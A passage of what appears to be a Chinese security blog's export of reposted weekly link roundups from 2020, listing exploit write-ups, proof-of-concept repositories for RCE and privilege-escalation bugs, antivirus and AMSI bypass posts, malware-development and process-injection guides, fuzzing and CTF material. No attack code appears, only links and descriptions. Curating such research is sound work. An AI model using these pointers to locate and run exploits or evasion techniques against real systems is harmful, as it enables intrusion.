class="line">https:&#x2F;&#x2F;www.mac4n6.com&#x2F;blog&#x2F;2020&#x2F;8&#x2F;23&#x2F;step-by-step-iphone-setup-for-ios-research-via-bizzybarneyiOS研究环境搭建</span><br></pre></td></tr></table></figure><p>•Reverse engineering and modifying an Android game (.apk) — CTF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;swlh&#x2F;reverse-engineering-and-modifying-an-android-game-apk-ctf-c617151b874c安卓APK逆向</span><br></pre></td></tr></table></figure><p>•Reverse Engineering The Medium App (and making all stories in it free)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;hackernoon&#x2F;dont-publish-yet-reverse-engineering-the-medium-app-and-making-all-stories-in-it-free-48c8f2695687逆向并破解MediumApp</span><br></pre></td></tr></table></figure><p>•Android Apk Reverse Engineering</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@chris.yn.chen&#x2F;apk-reverse-engineering-df7ed8cec191安卓apk逆向</span><br></pre></td></tr></table></figure><p>•A Voyage to Uncovering Telemetry: Identifying RPC Telemetry for Detection Engineers</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ipc-research.readthedocs.io&#x2F;en&#x2F;latest&#x2F;subpages&#x2F;RPC.htmlwindows RPC研究报告</span><br></pre></td></tr></table></figure><p>•MMS Exploit Part 5: Defeating Android ASLR, Getting RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;08&#x2F;mms-exploit-part-5-defeating-aslr-getting-rce.html安卓ASLR机制分析到RCE</span><br></pre></td></tr></table></figure><p>•Oversecured automatically discovers persistent code execution in the Google Play Core Library</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.oversecured.com&#x2F;Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library&#x2F;GooglePlayCoreLibrary漏洞挖掘与分析</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•serpentine</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jafarlihi&#x2F;serpentineserpentine windows远控工具</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•Advanced Binary Deobfuscation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;malrev&#x2F;ABD高级二进制反混淆课程</span><br></pre></td></tr></table></figure><p>•Bypassing Antivirus with Golang – Gopher it!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.jumpsec.com&#x2F;2019&#x2F;06&#x2F;20&#x2F;bypassing-antivirus-with-golang-gopher-it&#x2F;使用Golang绕过杀软</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.8.31-9.6一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.8.31-9.6%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.8.31-9.6%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-8-31-9-6一周安全知识动态"><a href="#2020-8-31-9-6一周安全知识动态" class="headerlink" title="2020.8.31-9.6一周安全知识动态"></a>2020.8.31-9.6一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•hyperv_local_dos_poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gerhart01&#x2F;hyperv_local_dos_pocHyper-V DoSPoC</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•Cisco warns of actively exploited IOS XR zero-day</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zdnet.com&#x2F;article&#x2F;cisco-warns-of-actively-exploited-ios-xr-zero-day&#x2F;CVE-2020-3566 cisco IOS XR 漏洞预警</span><br></pre></td></tr></table></figure><p>•JTAG Explained (finally!): Why “IoT”, Software Security Engineers, and Manufacturers Should Care</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.senr.io&#x2F;blog&#x2F;jtag-explainedJTAG解析的文章</span><br></pre></td></tr></table></figure><p>•pulse-gosecure-rce.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;withdk&#x2F;pulse-gosecure-rce-poc&#x2F;blob&#x2F;master&#x2F;pulse-gosecure-rce.pyPulseSecure RCE (CVE-2020-8218) exp</span><br></pre></td></tr></table></figure><p>•Emulating NotPetya bootloader with Miasm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;aguinet.github.io&#x2F;blog&#x2F;2020&#x2F;08&#x2F;29&#x2F;miasm-bootloader.html通过Miasm模拟运行NotPetya bootloader</span><br></pre></td></tr></table></figure><p>•WATCHCOM SECURITY GROUP UNCOVERS CISCO JABBER VULNERABILITIES</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;watchcom.no&#x2F;nyheter&#x2F;nyhetsarkiv&#x2F;uncovers-cisco-jabber-vulnerabilities&#x2F;CiscoJabber漏洞分析</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•Grammar-Mutator</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AFLplusplus&#x2F;Grammar-MutatorA grammar-based custom mutator for AFL++</span><br></pre></td></tr></table></figure><p>•The Sound of Silence: Mining Security Vulnerabilities from Secret Integration Channels in Open-Source Projects</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;arxiv.org&#x2F;pdf&#x2F;2009.01694.pdf开源框架漏洞挖掘</span><br></pre></td></tr></table></figure><h3 id="漏洞利用相关"><a href="#漏洞利用相关" class="headerlink" title="漏洞利用相关"></a>漏洞利用相关</h3><p>•The Current State of Exploit Development, Part 1</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.crowdstrike.com&#x2F;blog&#x2F;state-of-exploit-development-part-1&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.crowdstrike.com&#x2F;blog&#x2F;state-of-exploit-development-part-2&#x2F;</span><br><span class="line">漏洞利用发展过程</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•CVE-2020-5412: Hystrix Dashboard Proxy In spring-cloud-netflix-hystrix-dashboard</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tanzu.vmware.com&#x2F;security&#x2F;cve-2020-5412spring-cloud-netflix-hystrix-dashboard CVE-2020-5412 SSRF漏洞</span><br></pre></td></tr></table></figure><p>•Privilege Escalation in AWS Elastic Kubernetes Service (EKS) by compromising the instance role of worker nodes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.christophetd.fr&#x2F;privilege-escalation-in-aws-elastic-kubernetes-service-eks-by-compromising-the-instance-role-of-worker-nodes&#x2F;AWS ElasticKubernetes提权漏洞分析</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•CVE-2020-1380: Analysis of Recently Fixed IE Zero-Day</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.trendmicro.com&#x2F;en_us&#x2F;research&#x2F;20&#x2F;h&#x2F;cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.htmlCVE-2020-1380 IE漏洞分析</span><br></pre></td></tr></table></figure><p>•Deserialization Bugs In The Wild</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vkili.github.io&#x2F;blog&#x2F;insecure%20deserialization&#x2F;deserialization-in-the-wild&#x2F;反序列化漏洞分析</span><br></pre></td></tr></table></figure><p>•Java Buffer Overflow with ByteBuffer (CVE-2020-2803) and Mutable MethodType (CVE-2020-2805) Sandbox Escapes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;insinuator.net&#x2F;2020&#x2F;09&#x2F;java-buffer-overflow-with-bytebuffer-cve-2020-2803-and-mutable-methodtype-cve-2020-2805-sandbox-escapes&#x2F;CVE-2020-280及CVE-2020-2805Java漏洞分析</span><br></pre></td></tr></table></figure><p>•Lock screen/Bitlocker bypass/elevation of privilege in Bitlocker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;1S4jU7knBG_Km_AdHXf8JyE8zl0SOxQ9VvYFPanQy1g8&#x2F;edit#heading&#x3D;h.uqom8ty4aoh7Bitlocker提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Diving into unserialize()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vkili.github.io&#x2F;blog&#x2F;insecure%20deserialization&#x2F;unserialize&#x2F;php unserialize()函数分析</span><br></pre></td></tr></table></figure><p>•spring-view-manipulation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;veracode-research&#x2F;spring-view-manipulationSpringFramework框架中view安全性分析</span><br></pre></td></tr></table></figure><p>•Exploits in the Wild for vBulletin Pre-Auth RCE Vulnerability CVE-2020-17496</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;unit42.paloaltonetworks.com&#x2F;cve-2020-17496&#x2F;CVE-2020-17496 vBulletin 认证前RCE漏洞分析</span><br></pre></td></tr></table></figure><p>•CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;9&#x2F;2&#x2F;cve-2020-9715-exploiting-a-use-after-free-in-adobe-readerCVE-2020-9715AdobeReader UAF漏洞分析</span><br></pre></td></tr></table></figure><p>•Vulnerability Discovery in Open Source Libraries: Analyzing CVE-2020-11863</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.mcafee.com&#x2F;blogs&#x2F;other-blogs&#x2F;mcafee-labs&#x2F;vulnerability-discovery-in-open-source-libraries-analyzing-cve-2020-11863&#x2F;CVE-2020-11863 libEMF漏洞分析</span><br></pre></td></tr></table></figure><p>•How Do Generators… Generate, In SpiderMonkey?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.mgaudet.ca&#x2F;technical&#x2F;2020&#x2F;9&#x2F;1&#x2F;how-do-generators-generate-in-spidermonkeySpiderMonkeyGenerators原理分析</span><br></pre></td></tr></table></figure><p>•Exploit for <a href="https://bugs.chromium.org/p/chromium" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;trEQJgliUck&amp;feature&#x3D;youtu.be</span><br><span class="line">https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;chromium&#x2F;issues&#x2F;detail?id&#x3D;1068395Issue1068395在安卓平台上的利用视频</span><br></pre></td></tr></table></figure><p>•JITSploitation I: A JIT Bug</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;09&#x2F;jitsploitation-one.html</span><br><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;09&#x2F;jitsploitation-two.html</span><br><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;09&#x2F;jitsploitation-three.htmlproject zero</span><br><span class="line"></span><br><span class="line">关于jsc漏洞利用以及jsc缓解机制绕过系列文章</span><br></pre></td></tr></table></figure><p>•SIMPLE BUGS WITH COMPLEX EXPLOITS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.elttam.com&#x2F;blog&#x2F;simple-bugs-with-complex-exploits&#x2F;#contentv8 Issue2046详细分析</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•CVE-2020-7460: FREEBSD KERNEL PRIVILEGE ESCALATION</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;9&#x2F;1&#x2F;cve-2020-7460-freebsd-kernel-privilege-escalationCVE-2020-7460FreeBSD内核提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Advancing Windows Security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;query.prod.cms.rt.microsoft.com&#x2F;cms&#x2F;api&#x2F;am&#x2F;binary&#x2F;RE37dMCBluehatShanghai2019上Microsoft OS SecurityGroupManager关于windows安全机制的silde</span><br></pre></td></tr></table></figure><p>•DNS Server远程代码执行(CVE-2020-1350)【附DEMO视频】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s__biz&#x3D;MzUyMDEyNTkwNA&#x3D;&#x3D;&amp;mid&#x3D;2247484522&amp;idx&#x3D;1&amp;sn&#x3D;502839af26daa450f644488d75f42cc7&amp;chksm&#x3D;f9ee68d5ce99e1c37960b7909b5e5cc40f38c9b71711309ee679f0819c10218c1f411976ad6c&amp;scene&#x3D;126&amp;sessionid&#x3D;1598960570&amp;key&#x3D;7adf10a6617c6315506261e47c83d49da426185a83a97372680c51010cd9f8a9b7d827f8ce99f66a6a037a0e51e31792a56cebcaeb5dc0397f92e90c443832a945cc89d1d4fc750e1cd43c30783fc7f9e08c7694e22d7f0dc1bff61b42ff65d359c70b50ecbe5031962b57b47eda33f6e7a61941d4c2016c630eeeddbfe5840a&amp;ascene&#x3D;1&amp;uin&#x3D;MTE1NDEwMjc3NA%3D%3D&amp;devicetype&#x3D;Windows+10+x64&amp;version&#x3D;62090514&amp;lang&#x3D;en&amp;exportkey&#x3D;A9HOqRA5mpcUuAp59geFMeQ%3D&amp;pass_ticket&#x3D;C6B3Q%2FKQ1%2FUbGev7ZeEeTKkGew3nmNhXz3pU3Wex0luSd%2FRuu%2BJ716bUqCZs4JbG</span><br></pre></td></tr></table></figure><p>•CVE-2020-0986: Windows splwow64 Untrusted Pointer Dereference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;p&#x2F;rca-cve-2020-0986.htmlproject zero关于CVE-2020-0986 windows提权漏洞的分析</span><br></pre></td></tr></table></figure><p>•security things in Linux v5.6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;outflux.net&#x2F;blog&#x2F;archives&#x2F;2020&#x2F;09&#x2F;02&#x2F;security-things-in-linux-v5-6&#x2F;linux v5.6安全机制分析</span><br></pre></td></tr></table></figure><p>•Exploit Protection Reference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;security&#x2F;threat-protection&#x2F;microsoft-defender-atp&#x2F;exploit-protection-referencewindows官方关于防护机制的说明</span><br></pre></td></tr></table></figure><p>•Bypass AMSI by manual modification</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;s3cur3th1ssh1t.github.io&#x2F;Bypass_AMSI_by_manual_modification&#x2F;绕过AMSI机制</span><br></pre></td></tr></table></figure><p>•Windows 10 x64 1909 (OS Build 18363.719) • 10.0.18362.719 (WinBuild.160101.0800) • Out Of Bound Read and Write</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cpr-zero.checkpoint.com&#x2F;vulns&#x2F;cprid-2154&#x2F;CVE-2020-1247漏洞分析</span><br></pre></td></tr></table></figure><p>•Operation PowerFall: CVE-2020-0986 and variants</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securelist.com&#x2F;operation-powerfall-cve-2020-0986-and-variants&#x2F;98329&#x2F;CVE-2020-0986漏洞分析</span><br></pre></td></tr></table></figure><p>•This Font is not Your Type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;starlabs.sg&#x2F;blog&#x2F;2020&#x2F;09&#x2F;this-font-is-not-your-type&#x2F;苹果相关系统中libFontParser.dylib库字体漏洞分析</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•Reverse Engineering: Marvel’s Avengers - Developing a Server Emulator</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;krystalgamer.github.io&#x2F;avengers-emulator&#x2F;逆向分析Marvel&#39;s Avengers</span><br></pre></td></tr></table></figure><p>•Malware Development Pt. 1: Dynamic Module Loading in Go</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;posts.specterops.io&#x2F;malware-development-pt-1-dynamic-module-loading-in-go-1121f07f3a5aGo语言中的动态模块加载</span><br></pre></td></tr></table></figure><p>•AN EXHAUSTIVELY-ANALYZED IDB FOR COMRAT V4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.msreverseengineering.com&#x2F;blog&#x2F;2020&#x2F;8&#x2F;31&#x2F;an-exhaustively-analyzed-idb-for-comrat-v4COMRAT V4逆向分析</span><br></pre></td></tr></table></figure><p>•The Art of Port Scanning</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;phrack.org&#x2F;issues&#x2F;51&#x2F;11.html23年前nmap团队发表在phrack杂志上关于端口扫描的文章</span><br></pre></td></tr></table></figure><p>•Injecting to Remote Process via Thread Hijacking</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ired.team&#x2F;offensive-security&#x2F;code-injection-process-injection&#x2F;injecting-to-remote-process-via-thread-hijacking通过ThreadHijacking实现进程注入</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.9.7-9.13一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.9.7-9.13%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.9.7-9.13%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-9-7-9-13一周安全知识动态"><a href="#2020-9-7-9-13一周安全知识动态" class="headerlink" title="2020.9.7-9.13一周安全知识动态"></a>2020.9.7-9.13一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Google CTF 2020 teleport Chromium sandbox escape</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;trungnguyen1909.github.io&#x2F;blog&#x2F;post&#x2F;GGCTF20&#x2F;谷歌CTF2020 teleport Chromium沙箱逃逸writeup</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•Microsoft Hyper-V Stack Overflow Denial of Service</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.bluefrostsecurity.de&#x2F;advisories&#x2F;bfs-sa-2020-001&#x2F;Hyper-V 栈溢出漏洞poc</span><br></pre></td></tr></table></figure><p>•Microsoft Hyper-V NULL Pointer Dereference Denial of Service</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.bluefrostsecurity.de&#x2F;advisories&#x2F;bfs-sa-2020-002&#x2F;Hyper-V空指针引用poc</span><br></pre></td></tr></table></figure><p>•Microsoft Hyper-V Type Confusion leading to Arbitrary Memory Dereference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.bluefrostsecurity.de&#x2F;advisories&#x2F;bfs-sa-2020-003&#x2F;Hyper-V 类型混淆漏洞</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•F5 BIG-IP Remote Code Execution Exploit – CVE-2020-5902</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.criticalstart.com&#x2F;f5-big-ip-remote-code-execution-exploit&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Critical-Start&#x2F;Team-Ares&#x2F;tree&#x2F;master&#x2F;CVE-2020-5902CVE-2020-5902 </span><br><span class="line">F5 BIG-IP远程代码执行漏洞分析以及exp</span><br></pre></td></tr></table></figure><p>•HACKER NIGHTMARES GIVING HACKERS A HEADACHE WITH EXPLOIT MITIGATIONS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;azeria-labs.com&#x2F;downloads&#x2F;Keynote_ArmResearchSummit2020_Azeria.pdfARM安全机制研究slide</span><br></pre></td></tr></table></figure><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•echo_googlequals2020</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;saaramar&#x2F;echo_googlequals2020Google ctf 2020 echo writeup</span><br></pre></td></tr></table></figure><p>•google-ctf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;google-ctf&#x2F;tree&#x2F;master&#x2F;2020&#x2F;qualsgoogle-ctf 2020题目开源</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•Escalating PHP Deserialization</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vkili.github.io&#x2F;blog&#x2F;insecure%20deserialization&#x2F;unserialize-exploits&#x2F;php反序列化利用</span><br></pre></td></tr></table></figure><p>•Implementing Cloud Security Best Practices</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.tripwire.com&#x2F;solutions&#x2F;cloud-cybersecurity&#x2F;cloud-security-best-practices-report&#x2F;?utm_source&#x3D;twitter&amp;utm_medium&#x3D;ads&amp;utm_campaign&#x3D;cloud云安全分析</span><br></pre></td></tr></table></figure><p>•Abusing dynamic groups in Azure AD for privilege escalation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.mnemonic.no&#x2F;blog&#x2F;abusing-dynamic-groups-in-azure&#x2F;Azure AD提权分析</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•Bruteforce Attacks and Bypassing Rate Limits with Fireprox</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;it_V3ig1_4oWeb漏洞挖掘系列视频</span><br></pre></td></tr></table></figure><p>•[Fuzzing with WinAFL] Fuzzing a simple C program using WinAFL on windows</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hardik05.wordpress.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;fuzzing-with-winafl-fuzzing-a-simple-c-program-using-winafl-on-windows&#x2F;winafl fuzz 简单c程序</span><br></pre></td></tr></table></figure><p>•Stateful Fuzzing with Snapshots</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hexgolems.com&#x2F;talks&#x2F;fuzzcon2020.pdffuzzcon2020上关于《StatefulFuzzingwithSnapshots》的slide</span><br></pre></td></tr></table></figure><p>•Fuzzing JavaScript Engines with Fuzzilli</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 